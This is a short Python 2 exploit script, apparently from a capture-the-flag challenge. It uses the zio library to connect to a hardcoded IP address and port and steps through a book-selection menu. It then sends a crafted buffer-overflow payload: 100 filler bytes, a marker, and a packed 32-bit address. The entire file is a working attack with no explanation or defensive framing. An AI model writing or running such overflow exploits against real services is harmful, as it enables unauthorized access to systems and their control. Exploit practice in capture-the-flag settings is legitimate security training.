#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *

ip = '202.112.51.198'
port = 1234

io = zio((ip,port), timeout=1000, print_write=COLORED(REPR))
io.read_until('Selection: ')
io.writeline('3')
io.read_until('(1 - 100)?: ')
io.writeline('1')
io.read_until('book? ')
io.writeline('1')
io.read_until('Selection: ')

payload = 'a' * 100 + 'ABCD' + l32(0xA54D)

io.writeline('5')
io.writeline(payload)

io.read()
